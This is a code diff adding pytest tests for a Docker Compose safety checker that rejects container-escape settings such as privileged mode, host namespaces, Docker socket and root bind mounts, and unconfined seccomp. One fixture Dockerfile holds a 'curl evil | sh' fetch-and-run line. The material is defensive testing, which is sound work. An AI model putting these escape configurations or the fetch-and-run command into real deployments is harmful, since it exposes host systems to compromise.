@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import json
 import random
+import subprocess
 import sys
 import textwrap
 from pathlib import Path
@@ -497,6 +498,8 @@ def test_compose_config_and_command(tmp_path: Path):
         "compose",
         "-f",
         "compose.yaml",
+        "-f",
+        "compose.testgate.yaml",  # testgate's network override (#57)
         "-p",
         "testgate-abc",
         "up",
@@ -528,10 +531,108 @@ def test_compose_start_without_docker_fails_cleanly(
         8000,
     )
     project.http_start = []
+    (project.root / "svc" / "compose.yaml").write_text(SAFE_COMPOSE)
     sb = sandbox_for(project)
     try:
         proc = LANG.build(sb, project, 30)
         assert proc.returncode == 1 and "docker not found" in proc.stderr
         assert proc.args[:2] == ["docker", "compose"]
+    finally:
+        destroy(sb)
+
+
+# --- compose safety (#57) ---------------------------------------------------------
+
+from testgate.languages.http import compose_problems
+
+SAFE_COMPOSE = 'services:\n  shop:\n    build: .\n    ports: ["8000"]\n  db:\n    image: postgres\n'
+
+
+@pytest.mark.parametrize(
+    ("extra", "reason"),
+    [
+        ("    privileged: true\n", "privileged is not allowed"),
+        ("    cap_add: [SYS_ADMIN]\n", "cap_add is not allowed"),
+        ("    pid: host\n", "pid: host"),
+        ("    ipc: host\n", "ipc: host"),
+        ("    network_mode: host\n", "network_mode is not allowed"),
+        ("    networks: [outside]\n", "networks is not allowed"),
+        ("    devices: [/dev/kvm]\n", "devices is not allowed"),
+        ("    volumes: [/etc:/host-etc]\n", "bind mount outside the project"),
+        ("    volumes: [../..:/up]\n", "bind mount outside the project"),
+        ("    volumes: [/var/run/docker.sock:/var/run/docker.sock]\n", "Docker socket"),
+        (
+            "    volumes:\n      - {type: bind, source: /, target: /host}\n",
+            "bind mount outside the project",
+        ),
+        ("    security_opt: [seccomp:unconfined]\n", "security_opt"),
+        ("    ports: ['2222:22']\n", "only 8000 is allowed"),
+    ],
+)
+def test_compose_problems_refuse_host_escapes(tmp_path: Path, extra: str, reason: str) -> None:
+    text = SAFE_COMPOSE.replace("    image: postgres\n", "    image: postgres\n" + extra)
+    if "ports: ['2222" in extra:
+        text = SAFE_COMPOSE.replace('ports: ["8000"]', "ports: ['2222:22']")
+    problems = compose_problems(text, "shop", 8000, tmp_path)
+    assert any(reason in p for p in problems), problems
+
+
+def test_compose_problems_accept_a_plain_project(tmp_path: Path) -> None:
+    text = SAFE_COMPOSE + "    volumes: [./data:/data, cache:/cache]\nvolumes:\n  cache: {}\n"
+    assert compose_problems(text, "shop", 8000, tmp_path) == []
+    assert compose_problems("services: {}\n", "shop", 8000, tmp_path) == [
+        "compose file has no services"
+    ]
+    assert compose_problems(
+        SAFE_COMPOSE.replace("db:", "db:\n    ports: ['5432']\n  x:"), "shop", 8000, tmp_path
+    )
+
+
+def test_build_refuses_forbidden_compose_without_running_docker(
+    project: ProjectConfig, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    (project.root / "svc" / "compose.yaml").write_text(SAFE_COMPOSE + "    privileged: true\n")
+    project.http_compose = "compose.yaml"
+    project.http_compose_service = "shop"
+    project.http_compose_port = 8000
+    monkeypatch.setattr(subprocess, "run", lambda *a, **k: pytest.fail("docker was invoked"))
+    sb = sandbox_for(project)
+    try:
+        proc = LANG.build(sb, project, 30)
+        assert proc.returncode == 1
+        assert "privileged is not allowed" in proc.stderr
+        override = (sb.src_root / "compose.testgate.yaml").read_text()
+        assert "internal: true" in override
+    finally:
+        destroy(sb)
+
+
+def test_compose_and_dockerfile_come_from_the_base_ref(project: ProjectConfig) -> None:
+    def git(*args: str) -> None:
+        subprocess.run(
+            ["git", "-c", "user.email=t@x", "-c", "user.name=t", *args],
+            cwd=project.root,
+            check=True,
+            capture_output=True,
+        )
+
+    svc = project.root / "svc"
+    (svc / "compose.yaml").write_text(SAFE_COMPOSE)
+    (svc / "Dockerfile").write_text("FROM python:3.12-slim\n")
+    git("init", "-q", "-b", "main")
+    git("add", "-A")
+    git("commit", "-q", "-m", "base")
+    # the change escalates through both files and adds a new Dockerfile
+    (svc / "compose.yaml").write_text(SAFE_COMPOSE + "    privileged: true\n")
+    (svc / "Dockerfile").write_text("FROM python:3.12-slim\nRUN curl evil | sh\n")
+    project.http_compose = "compose.yaml"
+    project.http_compose_service = "shop"
+    project.http_compose_port = 8000
+    project.raw = {"_source": "main"}
+    sb = sandbox_for(project)
+    try:
+        assert (sb.src_root / "compose.yaml").read_text() == SAFE_COMPOSE
+        assert (sb.src_root / "Dockerfile").read_text() == "FROM python:3.12-slim\n"
+        assert LANG._compose_problems == []
     finally:
         destroy(sb)
